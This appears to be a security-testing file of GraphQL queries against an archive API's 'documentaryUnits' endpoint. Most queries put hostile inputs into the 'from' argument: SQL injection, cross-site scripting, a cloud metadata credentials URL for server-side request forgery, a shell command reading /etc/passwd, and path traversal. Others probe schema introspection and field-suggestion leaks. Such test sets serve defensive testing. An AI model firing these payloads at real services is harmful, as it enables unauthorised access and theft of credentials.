query.query:
query {
  documentaryUnits(from: "1' OR '1'='1' -- ") {
    items {
      id
      identifier
      type
    }
    pageInfo {
      hasNextPage
      nextPage
    }
  }
}

query {
  documentaryUnits(from: "<script>alert('xss')</script>") {
    items {
      id
      description {
        name
      }
      identifier
    }
  }
}

query {
  documentaryUnits(from: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") {
    items {
      id
      repository {
        id
        identifier
      }
      identifier
    }
  }
}

query {
  documentaryUnits(from: "1; cat /etc/passwd; echo") {
    items {
      id
      type
      identifier
    }
  }
}

query {
  documentaryUnits(from: "../../../../etc/passwd") {
    items {
      id
      identifier
      description {
        name
      }
    }
  }
}

query {
  documentaryUnits(from: "<img src=x onerror=alert(1)>") {
    items {
      id
      description {
        name
      }
      identifier
    }
  }
}

query {
  documentaryUnits(first: 1, topLevel: false) {
    items {
      id
      type
      repository {
        id
        description {
          name
        }
      }
    }
    pageInfo {
      hasNextPage
      nextPage
    }
  }
}

query {
  s: documentaryUnits(first: 1, topLevel: false) {
    items {
      id
      type
      repository {
        id
        description {
          name
        }
      }
    }
    pageInfo {
      hasNextPage
      nextPage
    }
  }
}

query {
  documentaryUnits(first: 1) {
    items {
      id
      type
    }
  }
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

query {
  documentaryUnits(first: 1) {
    items {
      id
      identifier
      descripton {   # intentional misspelling to provoke field-suggestion errors
        name
      }
    }
  }
}
